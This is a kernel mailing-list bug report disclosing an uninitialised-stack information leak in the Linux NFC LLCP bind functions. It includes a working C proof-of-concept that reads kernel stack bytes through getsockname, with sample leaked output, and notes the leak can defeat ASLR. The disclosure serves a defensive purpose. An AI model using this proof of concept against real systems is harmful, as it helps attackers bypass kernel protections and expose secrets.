From: Dmitry Vyukov <dvyukov@google.com>
Subject: Information leak in llcp_sock_bind/llcp_raw_sock_bind
Date: Tue, 15 Dec 2015 21:00:20 +0100
Message-ID: <CACT4Y+bjSFyXZi1PKTUsT9PhAYvCGiGjRkOBRbUON0Pw7rJxGg@mail.gmail.com>
Mime-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Cc: syzkaller <syzkaller@googlegroups.com>,
	Eric Dumazet <edumazet@google.com>,
	Kostya Serebryany <kcc@google.com>,
	Alexander Potapenko <glider@google.com>,
	Sasha Levin <sasha.levin@oracle.com>
To: Lauro Ramos Venancio <lauro.venancio@openbossa.org>,
	Aloisio Almeida Jr <aloisio.almeida@openbossa.org>,
	"David S. Miller" <davem@davemloft.net>,
	Samuel Ortiz <sameo@linux.intel.com>,
	linux-wireless@vger.kernel.org, netdev <netdev@vger.kernel.org>,
	LKML <linux-kernel@vger.kernel.org>
Return-path: <linux-kernel-owner@vger.kernel.org>
Sender: linux-kernel-owner@vger.kernel.org
List-Id: netdev.vger.kernel.org

Hello,

The following program leads to leak of unint bytes from kernel stack:

#include <sys/types.h>
#include <sys/socket.h>
#include <linux/in.h>
#include <linux/in6.h>
#include <linux/socket.h>
#include <linux/if.h>
#include <errno.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>

#define NFC_SOCKPROTO_LLCP 1

int main(void)
{
        struct sockaddr sa;
        unsigned len, i, try;
        int fd;

        for (try = 0; try < 3; try++) {
                fd = socket(AF_NFC, 3, NFC_SOCKPROTO_LLCP);
                if (fd == -1)
                        return;
                switch (try) {
                case 0:
                        break;
                case 1:
                        sched_yield();
                        break;
                case 2:
                        open("/dev/null", O_RDONLY);
                }
                memset(&sa, 0, sizeof(sa));
                sa.sa_family = AF_NFC;
                bind(fd, &sa, 2);
                len = sizeof(sa);
                getsockname(fd, &sa, &len);
                for (i = 0; i < len; i++)
                        printf("%02x", ((unsigned char*)&sa)[i]);
                printf("\n");
        }
        return 0;
}

Output:
27000000000000000000000000000000b002400000000000001f4511e5e38f900000000000000000b00240000000000018006c00000000007c134000000000000000000000000000000000000100000028f77610fe7f00005e10400000000000
27000000000000000000000000000000b002400000000000000212046c1647690000000000000000b00240000000000018006c00000000007c1340000000000000000000000000000000000001000000c874fff4fe7f00005e10400000000000
27000000000000000000000000000000b002400000000000008e8a91e4e069fc0000000000000000b00240000000000018006c00000000007c1340000000000000000000000000000000000001000000f868b3f2fe7f00005e10400000000000

The problem is that llcp_sock_bind/llcp_raw_sock_bind do not check
sockaddr_len passed in, so they copy stack garbage from stack into the
socket and then return it in getsockname.
This can defeat ASLR, leak crypto keys, etc.
